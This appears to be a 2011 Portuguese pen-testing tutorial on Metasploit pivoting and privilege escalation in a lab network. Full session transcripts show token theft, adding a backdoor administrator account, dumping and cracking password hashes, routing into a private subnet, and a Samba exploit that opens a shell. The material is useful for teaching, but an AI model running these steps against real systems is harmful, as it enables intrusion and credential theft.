@@ -1,0 +1,269 @@
+            ____
+        _.-'111 `"`--._
+    ,00010.  .01011,   ''-..
+  ,10101010  `111000. _ ____ ;
+ /_..__..-------- '''    __.'                                                          /
+ `-._       /""| _..-'''     ___  __   __             ___       __      __  .       __'  ___ .  __
+     "`-----\  `\           |    |  | | __ |  | |\/| |___ |    |  |    |__] | |\ | |__| |__/ | |  |
+             |   ;.-""--..  |___ |__| |__] |__| |  | |___ |___ |__|    |__] | | \| |  | |  \ | |__|
+             | ,10.  101. `.========================================  ==============================
+             `;1010  `0110  :                       1º Edição
+       .1""-.|`-._          ;
+      010 _.-|    +---+----'
+      `--'\` |    /  /                        ...:::binariae:fungus:::...
+ ~~~~~~~~~| /    |  |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+          \|    /   |
+           `----`---'
+language:Portuguese
+Autor: Gabriel Azeredo (SecMentor)
+contato: Twitter: secmentor // email: gabriel_azeredo@hotmail.com.br
+Data: 19/11/11
+Tipo: Paper
+Título: Pivoting and Privilege Escalation with Metasploit
+
+Introdução:
+
+Pivoting é o ato de evoluir dentro da rede invadida, ou seja, explorar alvos que estão presentes
+na mesma rede da primeira máquina explorada por meio da mesma. Um exemplo simples de como essa
+técnica pode ser muito útil, é o de que digamos que invadimos o web-site de uma empresa
+fornecedora de energia elétrica, aparentemente é somente um site sem alguma importância, porém
+evoluindo na rede invadida podemos chegar aos sistemas SCADA da empresa, caso tenho havido uma
+falha durante a montagem de arquitetura da rede, onde os sistemas de controle que deveriam ficar
+completamente isolados ficaram indiretamente expostos á web. Quando falamos de Pivoting não
+temos como fugir do meterpreter e consequentemente de metasploit. O payload mais conhecido do
+mundo hacker reúne as melhores opções para a execução de tal tarefa. Não só na hora de evoluir
+dentro da rede que podemos contar com o meterpreter, essa incrível ferramenta também nos auxilia
+na escalada de privilégios dentro do sistema, obtendo assim acesso root.
+
+Escalando Privilégios:
+
+O Meterpreter detem diversas formas de escalar privilégios dentro do sistema, a primeira que
+veremos é a captura de token. A técnica se baseia no roubo de um token do sistema inicialmente
+criado por um usuário Administrador, que tenha se conectado nas ultimas horas, dessa forma
+conseguimos personificar o usuário administrador sem a necessidade de senha. Apartir dai
+poderemos criar um usuário e elevar seus privilégios de forma a garantir os mesmos durante
+acessos posteriores. Acompanhe a execução do ataque:
+
+=================================================================================================
+=================================================================================================
+
+meterpreter > ps
+
+Process list
+============
+
+ PID   Name                 Arch  Session  User                           Path
+ ---   ----                 ----  -------  ----                           ----
+ 0     [System Process]
+ 4     System               x86   0        NT AUTHORITY\SYSTEM
+ 564   smss.exe             x86   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe
+ 612   csrss.exe            x86   0        NT AUTHORITY\SYSTEM            \??\C:\WINDOWS\system32\csrss.exe
+ 636   winlogon.exe         x86   0        NT AUTHORITY\SYSTEM            \??\C:\WINDOWS\system32\winlogon.exe
+ 680   services.exe         x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\services.exe
+ 692   lsass.exe            x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\lsass.exe
+ 844   vmacthlp.exe         x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\vmacthlp.exe
+ 860   svchost.exe          x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\svchost.exe
+ 928   svchost.exe          x86   0        NT AUTHORITY\NETWORK SERVICE   C:\WINDOWS\system32\svchost.exe
+ 1020  svchost.exe          x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
+ 1080  svchost.exe          x86   0        NT AUTHORITY\NETWORK SERVICE   C:\WINDOWS\system32\svchost.exe
+ 1132  svchost.exe          x86   0        NT AUTHORITY\LOCAL SERVICE     C:\WINDOWS\system32\svchost.exe
+ 1528  spoolsv.exe          x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\spoolsv.exe
+ 1568  explorer.exe         x86   0        GABRIEL-C66DB905\Administrator  C:\WINDOWS\Explorer.EXE
+ 1676  VMwareTray.exe       x86   0        GABRIEL-C66DB905\Administrator  C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+ 1684  VMwareUser.exe       x86   0        GABRIEL-C66DB905\Administrator  C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+ 1880  cmd.exe              x86   0        GABRIEL-C66DB905\Administrator  C:\WINDOWS\system32\cmd.exe
+ 208   vmtoolsd.exe         x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ 492   VMUpgradeHelper.exe  x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe
+ 1160  TPAutoConnSvc.exe    x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
+ 856   alg.exe              x86   0        NT AUTHORITY\LOCAL SERVICE     C:\WINDOWS\System32\alg.exe
+ 252   wscntfy.exe          x86   0        GABRIEL-C66DB905\Administrator  C:\WINDOWS\system32\wscntfy.exe
+ 1280  TPAutoConnect.exe    x86   0        GABRIEL-C66DB905\Administrator  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+ 2500  svchost.exe          x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
+
+meterpreter > steal_token 1880
+Stolen token with username: GABRIEL-C66DB905\Administrator
+meterpreter > getuid
+Server username: GABRIEL-C66DB905\Administrator
+meterpreter > shell
+Process 460 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>net user backtrack 123 /add
+net user backtrack 123 /add
+The command completed successfully.
+
+C:\WINDOWS\system32>net localgroup administrators backtrack /add
+net localgroup administrators backtrack /add
+The command completed successfully.
+
+================================================================================================
+================================================================================================
+
+Utilizamos o comando "ps" para listar os processos no sistema, e roubamos desta vez o token 1880
+que correspondia á uma sessão do cmd criada pelo Administrador. Depois, utilizamos o comando
+shell para executar comandos diretamente no sistema e não através do meterpreter, foi criado o
+usuário backtrack, que foi incluido no grupo de Administradores.
+
+Outra simples forma de se obter plenas pemissões dentro do sistema é executando o script
+getsystem , onde todo o trabalho será feito por ele. O script dispõe de diferentes técnicas que
+resultam na evolução dentro do sistema. Executando o comando getsystem sem alguma especificação
+fará ele testar todas as possibilidade para obter sucesso na escalada dos privilégios. Porém
+você pode especificar a técnica desejada com "getsystem -t" seguido do número correspondente á
+técnica desejada. Para obter os números execute "getsystem -h" . Lembre-se que antes da execução
+deve-se ter inicializado o módulo priv através do comando "use priv" :
+
+=================================================================================================
+=================================================================================================
+
+meterpreter > use priv
+[-] The 'priv' extension has already been loaded.
+meterpreter > getsystem -h
+Usage: getsystem [options]
+
+Attempt to elevate your privilege to that of local system.
+
+OPTIONS:
+
+    -h        Help Banner.
+    -t <opt>  The technique to use. (Default to '0').
+		0 : All techniques available
+		1 : Service - Named Pipe Impersonation (In Memory/Admin)
+		2 : Service - Named Pipe Impersonation (Dropper/Admin)
+		3 : Service - Token Duplication (In Memory/Admin)
+		4 : Exploit - KiTrap0D (In Memory/User)
+
+meterpreter > getsystem
+...got system (via technique 1).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+===============================================================================================
+===============================================================================================
+
+Também podemos utilizar o Hashdump. Todo sistema operacional possui um arquivo, onde é guardada
+a hash das senhas dos usuários do sistema. O módulo hashdump, extrai o usuário e a sua senha em
+forma de hash. Com tais informações podemos utilizar um dos milhares de hash crackers no mundo,
+para crackear a senha do administrador e assim obter acesso total ao sistema :
+
+================================================================================================
+================================================================================================
+
+meterpreter > use priv
+[-] The 'priv' extension has already been loaded.
+meterpreter > run post/windows/gather/hashdump
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 6b53098c427dd8e91e5be0ce984df0f7...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hashes...
+
+Administrator:500:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb12283678:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:1192ec55bbe4dea587e9636a0180b26b:ea9b55e14fe6156208e666ea9244ca6c:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:513a8affa826a41fe5b4be8e4b8c165b:::
+
+===============================================================================================
+===============================================================================================
+
+Após a execução do módulo obtemos a hash da senha do Admin ("ccf9155e3e7db453aad3b435b51404ee")
+que posteriormente foi quebrada pelo site http://www.onlinehashcrack.com/, resultando na senha
+123.
+
+Obs: Além do meterpreter alguns Live-cds Linux trazem ferramentas para quebrar as senhas da
+maquina local e acessa-la.
+
+Pivoting:
+
+Realizar Pivoting com Metasploit é uma tarefa relativamente fácil, com uma pequena série de
+comandos o meterpreter nos move para dentro da rede da máquina explorada, possibilitando a
+execução de port scanners, exploits, etc... É necessário fazer isso pois a maquina explorada
+obviamente não irá dar-lhe recursos para evoluir dentro da rede. Chega de enrolação, vamos
+demonstrar como isso funciona:
+
+=============================================================================================
+=============================================================================================
+
+meterpreter > use priv
+[-] The 'priv' extension has already been loaded.
+meterpreter > getsystem
+...got system (via technique 1).
+meterpreter > run get_local_subnets
+Local subnet: 192.168.1.0/255.255.255.0
+Local subnet: 192.168.159.0/255.255.255.0
+meterpreter > background
+msf exploit(ms08_067_netapi) > route add 192.168.159.0 255.255.255.0 1
+[*] Route added
+msf exploit(ms08_067_netapi) > use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) > set RHOSTS 192.168.159.0/24
+RHOSTS => 192.168.159.0/24
+msf auxiliary(tcp) > set PORTS 1-1000
+PORTS => 1-1000
+msf auxiliary(tcp) > set THREADS 50
+THREADS => 50
+msf auxiliary(tcp) > run
+
+[*] 192.168.159.135:139 - TCP OPEN
+[*] 192.168.159.135:135 - TCP OPEN
+[*] 192.168.159.135:445 - TCP OPEN
+[*] 192.168.159.132:21 - TCP OPEN
+[*] 192.168.159.132:22 - TCP OPEN
+[*] 192.168.159.132:23 - TCP OPEN
+[*] 192.168.159.132:25 - TCP OPEN
+[*] 192.168.159.132:53 - TCP OPEN
+[*] 192.168.159.132:80 - TCP OPEN
+[*] 192.168.159.132:139 - TCP OPEN
+[*] 192.168.159.132:445 - TCP OPEN
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(tcp) > use multi/samba/usermap_script
+msf exploit(usermap_script) > set RHOST 192.168.159.132
+RHOST => 192.168.159.132
+msf exploit(usermap_script) > set PAYLOAD cmd/unix/bind_perl
+PAYLOAD => cmd/unix/bind_perl
+msf exploit(usermap_script) > exploit -z
+
+[*] Started bind handler
+[*] Command shell session 2 opened (Local Pipe -> Remote Pipe) at 2011-11-20 21:25:15 -0200
+[*] Session 2 created in the background.
+
+msf exploit(usermap_script) > sessions -i 2
+[*] Starting interaction with 2...
+
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:56:07:ee
+          inet addr:192.168.159.132  Bcast:192.168.159.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe56:7ee/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:825 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:68785 (67.1 KB)  TX bytes:11524 (11.2 KB)
+          Interrupt:18 Base address:0x2000
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:335 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:335 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:164921 (161.0 KB)  TX bytes:164921 (161.0 KB)
+
+=================================================================================================
+=================================================================================================
+
+Primeiro executamos o comando "run get_local_subnets" e obtemos as subnets onde a máquina atacada
+está situada. Sendo 192.168.1.0 a rede local que o atacante tem acesso primeiramente, e
+192.168.159.0 a rede privada onde estão situadas a maquina atacada e o alvo do pivoting.
+Utilizamos o script route add para trazer o atacante para dentro da rede privada através da
+maquina exploitada. Scanneamos a rede e encontramos nosso alvo, o atacamos com sucesso e logo em
+seguida obtemos a shell.
+
+Conclusão:
+
+Este artigo acho que é mais uma amostra de como o metasploit se tornou uma ferramenta indispensavel
+para pen-testers, tomara que depois de terem lido vocês achem também. Espero que tenham gostado !!
+Qualquer duvida @secmentor !!
